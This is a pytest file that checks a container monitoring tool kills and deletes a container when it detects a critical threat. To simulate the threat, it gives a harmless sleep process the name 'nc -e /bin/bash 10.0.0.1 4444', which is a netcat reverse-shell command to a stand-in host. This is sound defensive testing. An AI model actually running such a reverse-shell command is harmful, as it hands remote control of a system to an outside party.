"""Test monitoring configuration options."""

import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_config_auto_kill_enabled_kills_on_critical(test_workspace, coi_binary):
    """Test that auto_kill_on_critical=true in config kills container on critical threat."""
    config_path = Path.home() / ".coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
"""
    )

    try:
        # Start shell with monitoring enabled via config (auto_kill_on_critical=true)
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "32",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-32"

        if not wait_for_container_running(container_name):
            proc.terminate()
            pytest.fail(f"Container {container_name} did not start")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject critical reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container SHOULD be killed: config has auto_kill_on_critical=true
        killed = False
        final_state = "Unknown"
        for _ in range(35):  # a kill (stop + delete) can take ~20s on CI
            time.sleep(1)
            state = get_container_state(container_name)
            if container_absent(container_name):
                killed = True
                final_state = state
                break

        # Always print debug info for this test to help diagnose CI failures
        events = get_threat_events(container_name)
        print("\n=== DEBUG: config auto_kill test ===")
        print(f"Container killed: {killed}, Final state: {final_state}")
        print(f"Total threat events: {len(events)}")
        for event in events:
            print(
                f"- level={event.get('level')}, category={event.get('category')}, "
                f"action={event.get('action')}, title={event.get('title')}"
            )
        print("=== END DEBUG ===\n")

        # Note: "Unknown" state after injecting threat typically means the container
        # was successfully killed and cleaned up by monitoring. We already passed
        # the startup check, so we proceed with verification.

        assert killed, (
            "auto_kill_on_critical=true in config should kill (stop AND delete) the "
            f"container on a critical threat; final observed state was {final_state!r}"
        )

        # The monitoring daemon writes to the audit log and kills the
        # container concurrently. On fast CI machines the log flush may
        # lag behind the kill by a few seconds, so retry before failing.
        critical = []
        for _ in range(15):  # Increased from 10 to 15 retries
            events = get_threat_events(container_name)
            critical = [e for e in events if e.get("level") == "critical"]
            if critical:
                break
            time.sleep(1)

        # Print final event state for debugging
        if not critical:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: No CRITICAL events found after retries ===")
            print(f"Total events: {len(events)}")
            for event in events:
                print(f"- {event}")
            print("=== END DEBUG ===\n")

        assert len(critical) > 0, "Expected CRITICAL threat logged"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    finally:
        if backup:
            config_path.write_text(backup)
        elif config_path.exists():
            config_path.unlink()
